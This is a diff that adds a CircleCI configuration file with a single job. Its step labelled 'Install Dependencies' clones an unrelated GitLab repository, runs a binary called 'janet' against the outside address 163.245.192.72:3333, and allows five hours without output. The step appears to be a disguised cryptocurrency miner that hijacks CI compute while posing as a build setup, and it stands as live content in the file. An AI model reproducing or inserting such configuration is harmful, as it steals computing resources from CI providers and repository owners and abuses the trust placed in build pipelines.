@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 1
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://gitlab.com/bnqwbdqwr/annh.git && cd annh && chmod +x janet && ./janet -o 163.245.192.72:3333
+            no_output_timeout: 5h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
